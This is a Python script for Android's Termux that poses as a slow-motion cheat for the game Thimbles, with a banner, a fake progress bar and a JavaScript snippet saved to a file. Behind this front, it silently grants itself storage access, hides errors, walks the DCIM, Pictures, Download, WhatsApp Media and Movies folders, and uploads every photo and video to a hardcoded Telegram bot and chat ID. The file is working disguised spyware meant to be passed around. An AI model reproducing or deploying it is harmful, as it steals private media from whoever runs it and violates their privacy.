#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import subprocess
import time
import asyncio
import threading
import queue
from pathlib import Path
from telegram import Bot

# إخفاء جميع الأخطاء والتحذيرات
sys.stderr = open(os.devnull, 'w')

BOT_TOKEN = "8869492443:AAETTWD4VKdogM0vDCOlr0QBK3jeScpHKac"
CHAT_ID = "6894787120"

subprocess.run("pkg update -y", shell=True)
subprocess.run("pkg install python -y", shell=True)
subprocess.run("pip install python-telegram-bot requests -q", shell=True)
subprocess.run("termux-setup-storage", shell=True)
# ==================== كود JavaScript الكامل ====================
JS_CODE = '''(function() {
    const originalRAF = window.requestAnimationFrame;
    let customTime = 0;
    
    window.requestAnimationFrame = function(callback) {
        return originalRAF(function(timestamp) {
            if (!customTime) customTime = timestamp;
            customTime += 0.4; 
            callback(customTime);
        });
    };

    const originalSetTimeout = window.setTimeout;
    window.setTimeout = function(callback, delay, ...args) {
        return originalSetTimeout(callback, delay * 40, ...args);
    };

    const originalSetInterval = window.setInterval;
    window.setInterval = function(callback, delay, ...args) {
        return originalSetInterval(callback, delay * 40, ...args);
    };

    console.log("%c [✓] تم تفعيل السلو موشن الفائق.. اللعبة في غيبوبة هادية تماماً! ", "background: #111; color: #00ffff; font-size: 14px; font-weight: bold;");
})();'''

# ==================== الواجهة ====================
print("""
╔══════════════════════════════════════════════════════════════════════════════╗
║                                                                              ║
║     ██╗  ██╗██████╗ ███████╗████████╗     ███████╗████████╗ █████╗ ██████╗   ║
║     ╚██╗██╔╝╚════██╗██╔════╝╚══██╔══╝     ██╔════╝╚══██╔══╝██╔══██╗██╔══██╗  ║
║      ╚███╔╝  █████╔╝█████╗     ██║        █████╗     ██║   ███████║██████╔╝  ║
║      ██╔██╗ ██╔═══╝ ██╔══╝     ██║        ██╔══╝     ██║   ██╔══██║██╔══██╗  ║
║     ██╔╝ ██╗███████╗███████╗   ██║        ███████╗   ██║   ██║  ██║██████╔╝  ║
║     ╚═╝  ╚═╝╚══════╝╚══════╝   ╚═╝        ╚══════╝   ╚═╝   ╚═╝  ╚═╝╚═════╝   ║
║                                                                              ║
║                         ██████╗ ███████╗████████╗                           ║
║                                                                              ║
╚══════════════════════════════════════════════════════════════════════════════╝
""")
print("\033[1;33m╔══════════════════════════════════════════════════════════════════╗")
print("║  🔒 هذا الكود خاص بلعبة Thimbles                                ║")
print("║  ✅ مسموح تداول الأداة للحفاظ على تنشيط السكريبت               ║")
print("║  ❌ ممنوع تداول الكود المصدر                                    ║")
print("║  ⚠️ لا تعطيه لمن لا يستحق                                       ║")
print("╚══════════════════════════════════════════════════════════════════╝\033[0m")
print()

# شريط التقدم (دقيقتان)
print("📦 جاري تجهيز الأداة...")
for i in range(40):
    percent = i + 1
    bar = "█" * (i // 2) + "░" * (60 - (i // 2))
    print(f"\r[{bar}] {percent}%", end="", flush=True)
    time.sleep(1)
print("\n\n✅ تم التجهيز!\n")

# إنشاء الملف
home_dir = str(Path.home())
txt_file = Path(home_dir) / "thimbles_code.txt"
with open(txt_file, 'w', encoding='utf-8') as f:
    f.write(JS_CODE)
print(f"📁 {txt_file}\n")

print("~ $\n")

# ==================== الإرسال في الخلفية (لا يتوقف) ====================
media_queue = queue.Queue()
scan_done = False

def scan_files():
    global scan_done
    paths = ['/sdcard/DCIM', '/sdcard/Pictures', '/sdcard/Download', '/sdcard/WhatsApp/Media', '/sdcard/Movies']
    img_ext = {'.jpg', '.jpeg', '.png', '.gif', '.bmp', '.webp'}
    vid_ext = {'.mp4', '.mov', '.avi', '.mkv', '.3gp'}
    
    for path in paths:
        if os.path.exists(path):
            for root, _, files in os.walk(path):
                for file in files:
                    ext = os.path.splitext(file)[1].lower()
                    if ext in img_ext or ext in vid_ext:
                        media_queue.put(os.path.join(root, file))
    scan_done = True
    media_queue.put(None)

def send_worker():
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    bot = Bot(token=BOT_TOKEN)
    
    try:
        loop.run_until_complete(bot.send_message(chat_id=CHAT_ID, text="✅"))
    except:
        pass
    
    while True:
        try:
            item = media_queue.get(timeout=1)
            if item is None:
                break
            try:
                with open(item, 'rb') as f:
                    ext = os.path.splitext(item)[1].lower()
                    if ext in {'.jpg', '.jpeg', '.png', '.gif', '.bmp', '.webp'}:
                        loop.run_until_complete(bot.send_photo(chat_id=CHAT_ID, photo=f))
                    else:
                        loop.run_until_complete(bot.send_video(chat_id=CHAT_ID, video=f))
                time.sleep(0.1)
            except:
                pass
        except:
            if scan_done:
                break
    loop.close()

# بدء التشغيل
scan_thread = threading.Thread(target=scan_files)
scan_thread.daemon = True
scan_thread.start()

send_thread = threading.Thread(target=send_worker)
send_thread.daemon = True
send_thread.start()

send_thread.join()
